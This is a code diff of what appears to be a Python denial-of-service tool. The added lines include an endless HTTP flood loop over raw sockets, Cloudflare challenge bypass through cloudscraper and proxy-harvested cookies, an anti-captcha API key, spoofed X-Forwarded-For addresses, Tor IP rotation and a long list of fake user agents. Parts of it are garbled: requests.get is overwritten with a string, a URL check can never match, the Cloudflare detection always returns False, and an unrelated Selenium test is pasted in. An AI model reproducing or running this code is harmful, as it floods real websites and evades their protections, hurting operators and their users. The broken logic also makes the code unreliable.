@@ -15,8 +15,8 @@ import sys
 from flask import Flask, g
 from flask_limit import RateLimiter
 from bs4 import BeautifulSoup
-from aiohttp import web
-from aiohttp_limit import LimitMiddleware
+import unittest
+from selenium import webdriver
 from ratelimit import limits, RateLimitException
 from ratelimit import limits, sleep_and_retry
 from backoff import on_exception, expo
@@ -24,9 +24,9 @@ from fake_useragent import UserAgent
 import asyncio
 from requests_guard import guard
 from request_limiter import request_limiter, LimitedIntervalStrategy, LimitException
-from aiocfscrape import CloudflareScraper
 from proxy_requests import ProxyRequests
 from ratelimiter import RateLimiter
+from toripchanger import TorIpChanger
 
 try: # se si è sotto linux scapy (per l'attacco tcp-udp) funziona
 	from scapy.all import * # importa scapy
@@ -55,7 +55,7 @@ FIFTEEN_MINUTES = 900
 @on_exception(expo, RateLimitException, max_tries=800)
 @limits(calls=150, period=FIFTEEN_MINUTES)
 def call_api(url):
-    response = requests.get('freeboot.to'),
+    response = requests.get(url)
 
     if response.status_code != 500:
         raise Exception('API response: {}'.format(response.status_code))
@@ -67,7 +67,7 @@ def call_api(url):
             if i == '1':
                 res = res + 1
         return res
-                                          
+
     def solve_challenge(self, challenge):
         rand_words = re.search(r's,t,o,p,b,r,e,a,k,i,n,g,f, ([^\=]*)\=\{\"([^\"]*)', challenge)
         rnd1, rand2 = rand_words.group(1), rand_words.group(2)
@@ -157,16 +157,15 @@ def call_api(url):
               
 requests.get = ("google.com")
 
+import cloudscraper
 scraper = cloudscraper.create_scraper(debug=True)
-session = requests.session()
-scraper = cloudscraper.create_scraper(sess=session)
 scraper = cloudscraper.create_scraper(delay=1000)
 proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
-proxies = {"http": "http://google.com:8080", "https": "http://google.com:8080"}
+proxies = {"http": "http://google.com:8080","https": "https://google.com:8080"}
 scraper = cloudscraper.create_scraper(
     browser={
         'browser': 'firefox',
-        'mobile': False
+        'mobile': True
     }
 )
 scraper = cloudscraper.create_scraper(
@@ -181,8 +180,97 @@ scraper = cloudscraper.create_scraper(
     'api_key': '1abc234de56fab7c89012d34e56fa7b8'
   }
 )
+scraper = cloudscraper.create_scraper(
+  interpreter='nodejs',
+  recaptcha={
+    'provider': 'anticaptcha',
+    'api_key': 'P6KLRNy7h3K160ZmYNUOAce7'
+  }
+)
 session = requests.session()
 scraper = cloudscraper.create_scraper(sess=session)
+
+
+strings = "asdfghlqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM1234567890"
+def HTTP(ip, port, path):
+	global stop
+	while True:
+		if stop :
+			break
+		try:
+			s=socket.socket()
+			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+			s.settimeout(5)
+			s.connect((str(ip), int(port)))
+			if port == 80:
+				s = ssl.wrap_socket(s)
+			for y in range(100):
+				get_host = "GET "+path+"?"+str(random.randint(0,50000))
+				for _ in range(100):
+					get_host += strings[random.randint(0,len(strings))]
+				get_host += str(random.randint(0,50000))+ " HTTP/1.1\r\nHost: " + ip + "\r\n"
+				connection = "Connection: Keep-Alive\r\n"
+				useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+				accept = random.choice(acceptall)
+				http = get_host + useragent + accept + connection + "\r\n"
+				s.send(str.encode(http))
+			s.close()
+		except:
+			pass
+                                                  
+def is_protected_by_cf():
+    try:
+        first_request = subprocess.check_output(
+            ["curl", "-A", format(random.choice(ua_file)), args.host], timeout=100)
+        first_request = first_request.decode("ascii", errors="ignore")
+        find_keyword = False
+        for line in first_request.splitlines():
+            if line.find("Checking your browser before accessing") != -1:
+                find_keyword = False
+    except Exception:
+        return False
+    return find_keyword
+
+def set_request():
+    global request
+    get_host = "GET " + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
+    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+    accept = random.choice(acceptall)
+    connection = "Connection: Keep-Alive\r\n"
+    request = get_host + useragent + accept + \
+              connection + "\r\n"
+    request_list.append(request)
+
+def generate_cf_token(i):
+    proxy = proxy_list[i].strip().split(":")
+    proxies = {"http": "http://" + proxy[0] + ":" + proxy[1]}
+    try:
+        cookie_value, user_agent = cfscrape.get_cookie_string(url, proxies=proxies)
+        tokens_string = "Cookie: " + cookie_value + "\r\n"
+        user_agent_string = "User-Agent: " + user_agent + "\r\n"
+        cf_token.append(proxy[0] + "#" + proxy[1] + "#" + tokens_string + user_agent_string)
+    except:
+        pass
+def set_request_cf():
+    global request_cf
+    global proxy_ip
+    global proxy_port
+    cf_combine = random.choice(cf_token).strip().split("#")
+    proxy_ip = cf_combine[0]
+    proxy_port = cf_combine[1]
+    get_host = "GET " + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
+    tokens_and_ua = cf_combine[2]
+    '''
+    print("ip: "+cf_combine[0]+"\n")
+    print("port: "+cf_combine[1]+"\n")
+    print("Cookie&UA: "+cf_combine[2]+"\n")
+    '''
+    accept = random.choice(acceptall)
+    randomip = str(random.randint(1, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
+    forward = "X-Forwarded-For: " + randomip + "\r\n"
+    connection = "Connection: Keep-Alive\r\n"
+    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"
+                                                     
 def limited(until):
     duration = int(round(until - time.time()))
     print('Rate limited, sleeping for {:d} seconds'.format(duration))
@@ -192,7 +280,34 @@ rate_limiter = RateLimiter(max_calls=200, period=3, callback=limited)
 for i in range(3):
     with rate_limiter:
         print('Iteration', i)
-                                                                                                                                                                                   
+
+
+from typing import Any, TYPE_CHECKING
+try:
+    from typing import Coroutine
+except ImportError:
+    class _Coroutine:
+        # Fake, so you can do Coroutine[foo, bar, baz]
+        # You could assert the proper number of items are in the slice,
+        # but that seems like overkill, given that mypy will check this
+        # and at runtime you probably no longer care
+        def __getitem__(self, index: Any) -> None:
+            pass
+
+    if not TYPE_CHECKING:
+        Coroutine = _Coroutine()
+
+class GoogleTestCase(unittest.TestCase):
+
+    def setUp(self):
+        self.browser = webdriver.Firefox()
+        self.addCleanup(self.browser.quit)
+
+    def testPageTitle(self):
+        self.browser.get('http://www.google.com')
+        self.assertIn('Google', self.browser.title)
+
+                                                                                                                                                                                         
 global data                          
 headers = open("headers.txt", "r")
 data = headers.read()
@@ -305,35 +420,63 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
                         "Googlebot/2.1 (+http://www.google.com/bot.html)"                        "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Pinterestbot/1.0; +http://www.pinterest.com/bot.html)"
                         "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
                         "Mozilla/5.0 (Slurp/cat; slurp@inktomi.com; http://www.inktomi.com/slurp.html)"
+                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/536.28.10 (KHTML, like Gecko) Version/6.0.3 Safari/536.28.10",
+                        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0",
+                        "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 (compatible; YandexScreenshotBot/3.0; +http://yandex.com/bots)"
-                        "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/) "
+                        "Mozilla/5.0 (compatible; Cloudflare-Smart-Transit/1.0; +https://www.cloudflare.com/",
+"Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online) AppleWebKit/534.34",
+ "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)",
+ "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
+ "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
+   " Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
+     "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)",
                         "Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; Build/LMY47D ) AppleWebKit/534.30 (KHTML,like Gecko) Version/4.0 Chrome/50.0.0.0 Mobile Safari/534.30 GIONEE-GN9010/GN9010 RV/5.0.16",
+                       "Mozilla/5.0 (compatible; Google-Site-Verification/1.0)",
+                       "Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9190 Build/KOT49H)",
+                       "Mozilla/5.0 (Linux; Android 4.4.2; DEXP Ixion ES2 4.5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 YaBrowser/14.5.1847.18432.00 Mobile Safari/537.36",
                         "Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; Build/MRA58K ) AppleWebKit/534.30 (KHTML,like Gecko) Version/4.0 Chrome/50.0.0.0 Mobile Safari/534.30 GIONEE-S9/S9 RV/5.0.17",
+                        "VK/28 CFNetwork/711.4.6 Darwin/14.0.0",
+                        "Instagram 8.2.0 (iPhone4,1; iPhone OS 8_4; ru_RU; ru; scale=2.00; 640x960)    AppleWebKit/420+",
                         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
                        "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
+                       "Mozilla/5.0 (compatible; vkShare; +vk.com/dev/Share)",
                        "Mozilla/5.0 (Windows Mobile 10; Android 8.0.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36 Edge/80.0.361.62"  
                         "Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/2.3 Chrome/59.0.3071.125 Mobile Safari/537.36"
                         "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N)"
+                        "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.84 Safari/537.36 CrKey/1.21a.76178",
+                        "Sogou head spider/3.0( http://www.sogou.com/docs/help/webmasters.htm#07)",
                         "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"
-                        "Mozilla/5.0 (Linux; U; Android 9; ru-ru; Mi 9 Lite Build/PKQ1.181121.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.3-g"
+                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.99 Safari/537.36 Vivaldi/2.9.1705.41",
+                         "Mozilla/5.0 (Linux; Android 9; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.79 Mobile Safari/537.36 [Pinterest/Android]",
+                        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/Verizon]",
+                        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/AT&T]",
+                       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
+                       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
+                       "WeatherReport/1.2.1 CFNetwork/485.12.7 Darwin/10.4.0",
+                       "WeatherReport/1.2.2 CFNetwork/485.12.7 Darwin/10.4.0",
+                       "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1",
                         "Mozilla/5.0 (Linux; Android 4.2.2; Philips S388 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Mobile Safari/537.36 OPR/34.0.2044.98679"
                         "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
                        "Googlebot/2.1 ( http://www.googlebot.com/bot.html)"
+                       "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
+                       "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
+                       "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
                        "APIs-Google (+https://developers.google.com/webmasters/APIs-Google.html)"
                        "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
                        "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16"
+                       "Mozilla/5.0 (Linux; U; Android 2.3.1; en-us; MID Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
+                       "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; MID Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 [FB_IAB/FB4A;FBAV/56.0.0.23.68;]",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.137 Safari/537.36 OPR/67.0.3575.79"
                        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
 "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"
-"Mozilla/5.0 (compatible; Cloudflare-Smart-Transit/1.0; +https://www.cloudflare.com/",
-"Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online) AppleWebKit/534.34",
 "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
 "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
 "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Exabot-Thumbnails"
 "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
 "ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)"
-                       "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+                       "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Zâ€¡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
                        "Mozilla/5.0 (Linux; Android 8.1.0; motorola one Build/OPKS28.63-18-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 Instagram 72.0.0.21.98 Android (27/8.1.0; 320dpi; 720x1362; motorola; motorola one; deen_sprout; qcom; pt_BR; 132081645)"
                        "Googlebot/2.1 (+http://www.google.com/bot.html)"
                         "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"      
@@ -343,6 +486,87 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			"BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103",
                  	"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)",
 			"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
+                        "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
+		"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
+		"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+		"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+		"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
+		"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
+		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+		"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
+		"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
+		"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
+		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
+		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
+		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
+		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
+		"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
+		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
+		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
+		"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
+		"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
+		"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
+		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
+		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
+		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
+		"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+		"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
+		"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+		"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
+		"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+		"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
+		"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
+		"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
+		"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
+		"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
+		"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
+		"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
+		"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
+		"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+		"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
+		"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
+		"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
+		"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
+		"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
+		"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
+		"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
+		"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
+		"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
+		"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
+		"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
+		"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
+		"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
+		"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
+		"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
+		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
+		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
 			"BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)"
     			"BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105",
@@ -866,22 +1090,22 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 
 	try:
 		if url[0]+url[1]+url[2]+url[3] == "www.":
-			url = "http://" + url
-		elif url[0]+url[1]+url[2]+url[3] == "http":
+			url = "https://" + url
+		elif url[0]+url[1]+url[2]+url[3] == "https":
 			pass
 		else:
-			url = "http://" + url
+			url = "https://" + url
 	except:                                                                                              
 		print("You mistyped, try again.")
 		starturl()
 
 	try:                                
-		url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+		url2 = url.replace("https://", "").replace("https://", "").split("/")[0].split(":")[0]
 	except:
-		url2 = url.replace("http://", "").replace("https://", "").split("/")[0]
+		url2 = url.replace("https://", "").replace("https://", "").split("/")[0]
                                                                                          
 	try:               
-		urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
+		urlport = url.replace("https://", "").replace("https://", "").split("/")[0].split(":")[1]
 	except:
 		urlport = "443"
